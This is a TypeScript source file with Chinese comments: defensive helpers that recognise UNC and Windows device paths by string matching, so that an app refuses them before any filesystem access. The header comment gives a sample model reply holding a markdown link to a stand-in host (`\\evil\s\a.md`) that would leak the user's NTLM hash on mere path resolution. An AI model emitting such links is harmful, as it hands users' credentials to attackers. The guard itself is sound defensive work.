/**
 * 一个路径是不是指向别的机器（UNC 共享）或 Windows 的设备命名空间。
 *
 * 只看字面，不碰文件系统，这正是它存在的理由：在 Windows 上对 `\\host\share\a.png` 做任何
 * fs 调用（哪怕只是 `realpath`、`stat`），系统都会先去连那台机器，并顺手递上当前用户的 NTLM
 * 凭据。模型回复里写一行 `[a](\\evil\s\a.md)`，链接还没点，哈希已经送出去了。所以这个判断
 * 必须排在一切 fs 操作之前。
 *
 * 按 Windows 的语义读：两个分隔符开头（`\\`、`//`、混写）就是 UNC，`\\?\`、`\\.\` 是设备路径。
 * POSIX 上 `//x` 只是 `/x` 的一种怪写法，应用自己从不产生它，一并拒掉不损失什么。渲染进程没有
 * `node:path`，所以这里只用字符串。
 */

/** `\\server\…`、`//server/…`、`\\?\…`、`\\.\…`。 */
export function isRemoteOrDevicePath(path: string): boolean {
	return /^[\\/]{2}/.test(path);
}

/**
 * UNC 路径落在哪个共享上：`server\share`，小写（Windows 比较主机名和共享名不分大小写）。
 *
 * 不是 UNC 的给 null。设备路径的「共享」是 `?\C:` 这种东西，照样能比——两边相等才算同一个地方。
 */
export function remoteShareOf(path: string): string | null {
	const match = /^[\\/]{2}([^\\/]+)[\\/]+([^\\/]+)/.exec(path);
	return match ? `${match[1]}\\${match[2]}`.toLowerCase() : null;
}
